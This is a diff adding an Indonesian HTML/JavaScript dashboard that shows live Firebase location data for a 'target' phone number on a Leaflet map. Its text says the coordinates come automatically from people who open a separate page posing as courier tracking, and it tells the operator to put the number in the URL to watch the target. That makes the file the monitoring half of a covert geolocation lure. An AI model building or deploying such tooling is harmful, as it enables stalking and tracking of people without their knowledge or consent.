@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard Lokasi Kurir</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="" />
+</head>
+<body>
+    <div class="dashboard-shell">
+        <header class="dashboard-header">
+            <div>
+                <p class="eyebrow">Mengecek Lokasi Kurir</p>
+                <h1>Dashboard Lokasi Kurir</h1>
+                <p class="subtitle">Dashboard ini menerima lokasi otomatis saat pengguna membuka halaman kurir. Pastikan parameter nomor target disertakan di URL.</p>
+                <p class="dashboard-target">Target nomor: <strong id="targetNumberLabel">-</strong></p>
+            </div>
+            <div class="header-badge">Live Tracking</div>
+        </header>
+
+        <main class="dashboard-layout">
+            <section class="panel panel-left">
+                <div class="card card-highlight">
+                    <div>
+                        <p class="card-label">Status Koneksi</p>
+                        <h2 id="statusLabel">Menunggu lokasi...</h2>
+                    </div>
+                    <div class="status-dot status-pending"></div>
+                </div>
+
+                <div class="card info-card">
+                    <h3>Informasi Lokasi</h3>
+                    <div class="info-grid">
+                        <div>
+                            <span>Koordinat</span>
+                            <strong id="coordText">-</strong>
+                        </div>
+                        <div>
+                            <span>Accuracy</span>
+                            <strong id="accuracyText">-</strong>
+                        </div>
+                        <div>
+                            <span>Waktu</span>
+                            <strong id="timeText">-</strong>
+                        </div>
+                        <div>
+                            <span>Browser</span>
+                            <strong id="browserText">-</strong>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card action-card">
+                    <div>
+                        <p class="card-label">Perintah</p>
+                        <h3>Mulai ulang koneksi</h3>
+                    </div>
+                    <button id="refreshBtn" class="btn-primary">Refresh koneksi</button>
+                    <p class="hint-text">Tekan untuk menyambungkan ulang ke Firebase dan memeriksa kembali data lokasi target.</p>
+                </div>
+
+                <div class="card note-card">
+                    <h3>Catatan Penting</h3>
+                    <p>Dashboard ini membaca data dari Firebase yang dikirim oleh <code>mengeceklokasikurir.html</code>. Gunakan URL seperti <code>dashboard.html?num=08139369239</code> untuk mengawasi target.</p>
+                </div>
+            </section>
+
+            <section class="panel panel-right">
+                <div class="map-card">
+                    <div class="map-header">
+                        <div>
+                            <p class="card-label">Peta Lokasi</p>
+                            <h2>Posisi Kurir</h2>
+                        </div>
+                        <span id="mapIndicator" class="map-indicator map-pending">Belum diperbarui</span>
+                    </div>
+                    <div id="map" class="map-frame"></div>
+                </div>
+
+                <div class="card log-card">
+                    <h3>Aktivitas Pelacakan</h3>
+                    <ul id="logList" class="log-list">
+                        <li>Menunggu permintaan lokasi...</li>
+                    </ul>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <script>
+        const statusLabel = document.getElementById('statusLabel');
+        const coordText = document.getElementById('coordText');
+        const accuracyText = document.getElementById('accuracyText');
+        const timeText = document.getElementById('timeText');
+        const browserText = document.getElementById('browserText');
+        const mapIndicator = document.getElementById('mapIndicator');
+        const logList = document.getElementById('logList');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const targetNumberLabel = document.getElementById('targetNumberLabel');
+
+        const targetNumber = new URLSearchParams(window.location.search).get('num');
+        const firebaseConfig = {
+            apiKey: "COPAS_API_KEY_KAMU",
+            authDomain: "PROJECT_KAMU.firebaseapp.com",
+            databaseURL: "https://PROJECT_KAMU-default-rtdb.firebaseio.com",
+            projectId: "PROJECT_KAMU",
+            storageBucket: "PROJECT_KAMU.appspot.com",
+            messagingSenderId: "ID_KAMU",
+            appId: "APP_ID_KAMU"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        let firebaseRef = null;
+        let map;
+        let marker;
+
+        function addLog(message) {
+            const item = document.createElement('li');
+            item.textContent = message;
+            logList.prepend(item);
+            if (logList.children.length > 6) {
+                logList.removeChild(logList.lastChild);
+            }
+        }
+
+        function updateStatus(state, text) {
+            statusLabel.textContent = text;
+            mapIndicator.textContent = text;
+            mapIndicator.className = `map-indicator map-${state}`;
+            document.querySelector('.status-dot').className = `status-dot status-${state}`;
+        }
+
+        function formatTime(timestamp) {
+            const date = new Date(timestamp);
+            return `${date.toLocaleDateString('id-ID')} ${date.toLocaleTimeString('id-ID')}`;
+        }
+
+        function setLocation(data) {
+            const lat = parseFloat(data.latitude).toFixed(6);
+            const lng = parseFloat(data.longitude).toFixed(6);
+            const acc = data.accuracy ? `${Math.round(data.accuracy)} m` : 'N/A';
+            const time = data.waktu || formatTime(Date.now());
+
+            coordText.textContent = `${lat}, ${lng}`;
+            accuracyText.textContent = acc;
+            timeText.textContent = time;
+            browserText.textContent = data.userAgent || navigator.userAgent;
+
+            updateStatus('active', 'Data lokasi diterima');
+            addLog(`Lokasi remote diterima: ${lat}, ${lng} (${data.status || 'unknown'})`);
+
+            if (!marker) {
+                marker = L.marker([lat, lng]).addTo(map);
+                marker.bindPopup('Posisi kurir saat ini').openPopup();
+            } else {
+                marker.setLatLng([lat, lng]);
+            }
+
+            map.setView([lat, lng], 14, { animate: true });
+        }
+
+        function handleRemoteError(message) {
+            updateStatus('error', 'Gagal sinkronisasi');
+            coordText.textContent = '-';
+            accuracyText.textContent = '-';
+            timeText.textContent = '-';
+            addLog(message);
+        }
+
+        function listenRemoteLocation() {
+            if (!targetNumber) {
+                updateStatus('error', 'Target belum ditentukan');
+                addLog('Tambahkan ?num=08139369239 pada URL dashboard.');
+                return;
+            }
+
+            targetNumberLabel.textContent = targetNumber;
+            updateStatus('loading', 'Menghubungkan ke Firebase...');
+            addLog(`Mencari data target ${targetNumber}...`);
+
+            if (firebaseRef) {
+                firebaseRef.off();
+            }
+
+            firebaseRef = database.ref(`tracked_users/${targetNumber}`);
+            firebaseRef.on('value', (snapshot) => {
+                const value = snapshot.val();
+                if (!value) {
+                    updateStatus('warning', 'Menunggu data target');
+                    addLog(`Belum ada data untuk ${targetNumber}.`);
+                    return;
+                }
+
+                if (!value.latitude || !value.longitude) {
+                    handleRemoteError('Data lokasi target tidak lengkap.');
+                    return;
+                }
+
+                setLocation(value);
+            }, (error) => {
+                handleRemoteError(`Firebase error: ${error.message}`);
+            });
+        }
+
+        function initMap() {
+            map = L.map('map', {
+                zoomControl: false,
+                attributionControl: false
+            }).setView([-2.5489, 118.0149], 5);
+
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                maxZoom: 19
+            }).addTo(map);
+
+            L.control.zoom({ position: 'bottomright' }).addTo(map);
+        }
+
+        refreshBtn.addEventListener('click', function() {
+            addLog('Memulai ulang koneksi Firebase.');
+            listenRemoteLocation();
+        });
+
+        window.addEventListener('load', function() {
+            initMap();
+            listenRemoteLocation();
+        });
+    </script>
+</body>
+</html>
